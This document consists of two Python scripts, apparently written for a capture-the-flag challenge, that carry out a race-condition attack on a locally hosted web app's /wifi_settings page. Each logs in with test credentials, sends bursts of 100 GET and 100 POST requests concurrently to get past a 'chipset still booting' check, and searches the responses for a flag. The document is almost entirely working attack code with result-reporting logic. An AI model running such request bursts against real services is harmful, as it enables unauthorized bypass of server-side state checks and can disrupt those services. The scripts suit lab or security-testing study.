import requests
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

# Target configuration
BASE_URL = "http://127.0.0.1:32992"
LOGIN_URL = f"{BASE_URL}/login"
WIFI_URL = f"{BASE_URL}/wifi_settings"

# Authentication credentials
USERNAME = "test"
PASSWORD = "test"

# Attack configuration
TOTAL_GET = 100
TOTAL_POST = 100
MAX_CONCURRENT = 50

# Results tracking
results = {
    'get': {'success': 0, 'boot_error': 0, 'other': 0, 'responses': []},
    'post': {'success': 0, 'boot_error': 0, 'other': 0, 'responses': []}
}
results_lock = threading.Lock()

print("[*] Starting Race Condition Attack: Mixed GET/POST Burst with State Confusion")
print(f"[*] Configuration: {TOTAL_GET} GET + {TOTAL_POST} POST, max {MAX_CONCURRENT} concurrent")

# Step 1: Authenticate and get fresh session
print("\n[1] Authenticating...")
session = requests.Session()
login_resp = session.post(LOGIN_URL, data={'username': USERNAME, 'password': PASSWORD}, allow_redirects=False)
print(f"    Login status: {login_resp.status_code}")

# Extract session cookie
cookies = session.cookies.get_dict()
print(f"    Session cookies: {cookies}")

if 'session' not in cookies:
    print("[!] Failed to get session cookie!")
    print(f"    Response: {login_resp.text}")
else:
    print(f"    Session obtained: {cookies['session'][:20]}...")

# Prepare request queue - alternating GET/POST
request_queue = []
for i in range(max(TOTAL_GET, TOTAL_POST)):
    if i < TOTAL_GET:
        request_queue.append(('GET', i))
    if i < TOTAL_POST:
        request_queue.append(('POST', i))

print(f"\n[2] Prepared {len(request_queue)} requests in alternating sequence")

# Step 3: Execute burst attack
def make_request(req_type, req_id):
    """Make a single request and analyze response"""
    try:
        if req_type == 'GET':
            resp = session.get(WIFI_URL, timeout=10)
        else:  # POST
            resp = session.post(
                WIFI_URL,
                data={'ssid': 'test', 'channel': '6', 'mode': 'g'},
                timeout=10
            )
        
        response_text = resp.text
        status_code = resp.status_code
        
        # Analyze response
        has_boot_error = "WiFi chipset is still booting" in response_text
        has_success = any(keyword in response_text.lower() for keyword in ['success', 'flag', 'updated', 'saved', 'configured'])
        
        result = {
            'type': req_type,
            'id': req_id,
            'status': status_code,
            'length': len(response_text),
            'has_boot_error': has_boot_error,
            'has_success': has_success,
            'text_sample': response_text[:500] if len(response_text) > 500 else response_text
        }
        
        with results_lock:
            if has_boot_error:
                results[req_type.lower()]['boot_error'] += 1
            elif has_success or (status_code == 200 and req_type == 'POST' and not has_boot_error):
                results[req_type.lower()]['success'] += 1
                results[req_type.lower()]['responses'].append(result)
            else:
                results[req_type.lower()]['other'] += 1
                results[req_type.lower()]['responses'].append(result)
        
        return result
        
    except Exception as e:
        return {'type': req_type, 'id': req_id, 'error': str(e)}

print("[3] Executing burst attack...")
start_time = time.time()

# Execute all requests with thread pool
all_results = []
with ThreadPoolExecutor(max_workers=MAX_CONCURRENT) as executor:
    futures = {executor.submit(make_request, req_type, req_id): (req_type, req_id) 
               for req_type, req_id in request_queue}
    
    for future in as_completed(futures):
        result = future.result()
        all_results.append(result)

elapsed = time.time() - start_time
rate = len(request_queue) / elapsed

print(f"\n[4] Attack completed in {elapsed:.2f}s ({rate:.1f} req/s)")

# Step 4: Analyze results
print("\n" + "="*60)
print("RESULTS SUMMARY")
print("="*60)

print(f"\nTotal requests: {len(request_queue)}")
print(f"GET requests: {TOTAL_GET}")
print(f"POST requests: {TOTAL_POST}")

print("\n--- GET Results ---")
get_total = results['get']['success'] + results['get']['boot_error'] + results['get']['other']
print(f"  Boot errors: {results['get']['boot_error']}/{get_total}")
print(f"  Success indicators: {results['get']['success']}/{get_total}")
print(f"  Other: {results['get']['other']}/{get_total}")

print("\n--- POST Results ---")
post_total = results['post']['success'] + results['post']['boot_error'] + results['post']['other']
print(f"  Boot errors: {results['post']['boot_error']}/{post_total}")
print(f"  Success indicators: {results['post']['success']}/{post_total}")
print(f"  Other: {results['post']['other']}/{post_total}")

# Calculate status code distribution
status_codes = {}
for r in all_results:
    if 'status' in r:
        key = f"{r['type']}-{r['status']}"
        status_codes[key] = status_codes.get(key, 0) + 1

print("\n--- Status Code Distribution ---")
for key, count in sorted(status_codes.items()):
    print(f"  {key}: {count}")

# Check for winning responses
winning_responses = []
for r in all_results:
    if 'error' not in r:
        # Win = POST without boot error, or any response with success keyword
        if (r['type'] == 'POST' and not r.get('has_boot_error', True)) or r.get('has_success', False):
            winning_responses.append(r)

print("\n--- SUCCESS/WINNING RESPONSES ---")
if winning_responses:
    print(f"[!] FOUND {len(winning_responses)} potentially successful responses!")
    for i, wr in enumerate(winning_responses[:10]):  # Show first 10
        print(f"\n  Win #{i+1}:")
        print(f"    Type: {wr['type']} | ID: {wr['id']} | Status: {wr['status']}")
        print(f"    Length: {wr['length']}B")
        print(f"    Boot error: {wr.get('has_boot_error', 'N/A')}")
        print(f"    Has success keyword: {wr.get('has_success', False)}")
        print(f"    Response preview:\n{wr.get('text_sample', 'N/A')[:800]}")
        print("-" * 50)
else:
    print("  No winning responses found (all had boot errors or no success indicators)")

# Check for FLAG specifically
print("\n--- FLAG SEARCH ---")
flag_found = False
for r in all_results:
    if 'text_sample' in r and 'FLAG' in r['text_sample'].upper():
        print(f"[!] FLAG FOUND in {r['type']} request {r['id']}!")
        print(f"    Response: {r['text_sample']}")
        flag_found = True

if not flag_found:
    print("  No FLAG found in any response")

print("\n--- Sample Error Responses (first 3 POST boot errors) ---")
boot_error_samples = [r for r in all_results if r.get('has_boot_error') and r['type'] == 'POST'][:3]
for i, r in enumerate(boot_error_samples):
    print(f"\n  Sample {i+1} (POST {r['id']}):")
    print(f"    Status: {r['status']} | Length: {r['length']}B")
    print(f"    Response: {r.get('text_sample', 'N/A')[:400]}")

print("\n" + "="*60)
print(f"FINAL: Success count (non-boot-error POSTs): {results['post']['success']}")
print("="*60)

import asyncio
import aiohttp
import time

# Target configuration
BASE_URL = "http://127.0.0.1:32992"
LOGIN_URL = f"{BASE_URL}/login"
WIFI_URL = f"{BASE_URL}/wifi_settings"

# Authentication credentials
USERNAME = "test"
PASSWORD = "test"

# Attack configuration
TOTAL_GET = 100
TOTAL_POST = 100
MAX_CONCURRENT = 50

print("[*] Starting Race Condition Attack: Mixed GET/POST Burst with State Confusion")
print(f"[*] Configuration: {TOTAL_GET} GET + {TOTAL_POST} POST, max {MAX_CONCURRENT} concurrent")

# Results tracking
results = {
    'GET': {'success': 0, 'boot_error': 0, 'other': 0, 'responses': []},
    'POST': {'success': 0, 'boot_error': 0, 'other': 0, 'responses': []}
}

async def login_and_get_session():
    """Authenticate and return session cookie"""
    print("\n[1] Authenticating...")
    async with aiohttp.ClientSession() as session:
        async with session.post(LOGIN_URL, data={'username': USERNAME, 'password': PASSWORD}, allow_redirects=False) as resp:
            print(f"    Login status: {resp.status}")
            cookies = resp.cookies
            session_cookie = cookies.get('session')
            if session_cookie:
                print(f"    Session obtained: {str(session_cookie.value)[:20]}...")
                return str(session_cookie.value)
            else:
                print(f"    Cookies: {dict(cookies)}")
                text = await resp.text()
                print(f"    Response: {text[:500]}")
                return None

async def make_request(session, sem, req_type, req_id):
    """Make a single request and analyze response"""
    async with sem:  # Limit concurrency
        try:
            if req_type == 'GET':
                async with session.get(WIFI_URL, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                    response_text = await resp.text()
                    status_code = resp.status
            else:  # POST
                async with session.post(
                    WIFI_URL,
                    data={'ssid': 'test', 'channel': '6', 'mode': 'g'},
                    timeout=aiohttp.ClientTimeout(total=10)
                ) as resp:
                    response_text = await resp.text()
                    status_code = resp.status
            
            # Analyze response
            has_boot_error = "WiFi chipset is still booting" in response_text
            has_success = any(keyword in response_text.lower() for keyword in ['success', 'flag', 'updated', 'saved', 'configured', 'wifi settings updated'])
            
            result = {
                'type': req_type,
                'id': req_id,
                'status': status_code,
                'length': len(response_text),
                'has_boot_error': has_boot_error,
                'has_success': has_success,
                'text_sample': response_text[:800] if len(response_text) > 800 else response_text
            }
            
            # Update results
            if has_boot_error:
                results[req_type]['boot_error'] += 1
            elif has_success:
                results[req_type]['success'] += 1
                results[req_type]['responses'].append(result)
            else:
                # For POST without boot error and 200 status, consider as potential win
                if req_type == 'POST' and status_code == 200 and not has_boot_error:
                    results[req_type]['success'] += 1
                    results[req_type]['responses'].append(result)
                else:
                    results[req_type]['other'] += 1
                    results[req_type]['responses'].append(result)
            
            return result
            
        except Exception as e:
            return {'type': req_type, 'id': req_id, 'error': str(e)}

async def main():
    # Step 1: Login
    session_cookie = await login_and_get_session()
    if not session_cookie:
        print("[!] Failed to authenticate")
        return
    
    # Prepare cookies for session
    cookies = {'session': session_cookie}
    
    print(f"\n[2] Preparing request queue...")
    # Prepare request queue - alternating GET/POST
    request_queue = []
    for i in range(max(TOTAL_GET, TOTAL_POST)):
        if i < TOTAL_GET:
            request_queue.append(('GET', i))
        if i < TOTAL_POST:
            request_queue.append(('POST', i))
    
    print(f"    Total requests: {len(request_queue)}")
    
    # Create semaphore for concurrency control
    sem = asyncio.Semaphore(MAX_CONCURRENT)
    
    print(f"\n[3] Executing burst attack with {MAX_CONCURRENT} concurrent connections...")
    start_time = time.time()
    
    async with aiohttp.ClientSession(cookies=cookies) as session:
        tasks = [make_request(session, sem, req_type, req_id) for req_type, req_id in request_queue]
        all_results = await asyncio.gather(*tasks)
    
    elapsed = time.time() - start_time
    rate = len(request_queue) / elapsed
    
    print(f"\n[4] Attack completed in {elapsed:.2f}s ({rate:.1f} req/s)")
    
    # Step 4: Analyze results
    print("\n" + "="*60)
    print("RESULTS SUMMARY")
    print("="*60)
    
    print(f"\nTotal requests: {len(request_queue)}")
    print(f"GET requests: {TOTAL_GET}")
    print(f"POST requests: {TOTAL_POST}")
    
    print("\n--- GET Results ---")
    get_total = sum(results['GET'].values()) - len(results['GET']['responses'])
    get_total = results['GET']['success'] + results['GET']['boot_error'] + results['GET']['other']
    print(f"  Boot errors: {results['GET']['boot_error']}/{TOTAL_GET}")
    print(f"  Success indicators: {results['GET']['success']}/{TOTAL_GET}")
    print(f"  Other: {results['GET']['other']}/{TOTAL_GET}")
    
    print("\n--- POST Results ---")
    post_total = results['POST']['success'] + results['POST']['boot_error'] + results['POST']['other']
    print(f"  Boot errors: {results['POST']['boot_error']}/{TOTAL_POST}")
    print(f"  Success indicators: {results['POST']['success']}/{TOTAL_POST}")
    print(f"  Other: {results['POST']['other']}/{TOTAL_POST}")
    
    # Calculate status code distribution
    status_codes = {}
    for r in all_results:
        if 'status' in r:
            key = f"{r['type']}-{r['status']}"
            status_codes[key] = status_codes.get(key, 0) + 1
    
    print("\n--- Status Code Distribution ---")
    for key, count in sorted(status_codes.items()):
        print(f"  {key}: {count}")
    
    # Check for winning responses (POST without boot error)
    winning_responses = [r for r in all_results if r.get('type') == 'POST' and not r.get('has_boot_error', True)]
    
    print("\n--- POTENTIALLY SUCCESSFUL POSTS (no boot error) ---")
    print(f"Found: {len(winning_responses)}")
    
    if winning_responses:
        print(f"\n[!] FOUND {len(winning_responses)} POST responses WITHOUT boot error!")
        for i, wr in enumerate(winning_responses[:5]):  # Show first 5
            print(f"\n  Win #{i+1}:")
            print(f"    Type: {wr['type']} | ID: {wr['id']} | Status: {wr['status']}")
            print(f"    Length: {wr['length']}B")
            print(f"    Has success keyword: {wr.get('has_success', False)}")
            print(f"    Response preview:\n{wr.get('text_sample', 'N/A')[:1000]}")
            print("-" * 50)
    else:
        print("  All POST requests returned boot errors")
    
    # Check for FLAG specifically
    print("\n--- FLAG SEARCH ---")
    flag_found = False
    for r in all_results:
        if 'text_sample' in r and 'FLAG' in r['text_sample'].upper():
            print(f"[!] FLAG FOUND in {r['type']} request {r['id']}!")
            print(f"    Response: {r['text_sample']}")
            flag_found = True
    
    if not flag_found:
        print("  No FLAG found in any response")
    
    # Show error responses sample
    print("\n--- Sample Boot Error Responses (first 3 POSTs) ---")
    boot_error_samples = [r for r in all_results if r.get('has_boot_error') and r.get('type') == 'POST'][:3]
    for i, r in enumerate(boot_error_samples):
        print(f"\n  Sample {i+1} (POST {r['id']}):")
        print(f"    Status: {r['status']} | Length: {r['length']}B")
        print(f"    Response: {r.get('text_sample', 'N/A')[:500]}")
    
    print("\n" + "="*60)
    print(f"FINAL VERDICT:")
    print(f"  POST success (no boot error): {len(winning_responses)}")
    print(f"  Total POST attempts: {TOTAL_POST}")
    print(f"  Win rate: {len(winning_responses)/TOTAL_POST*100:.2f}%" if TOTAL_POST > 0 else "N/A")
    print("="*60)

# Run the attack
asyncio.run(main())
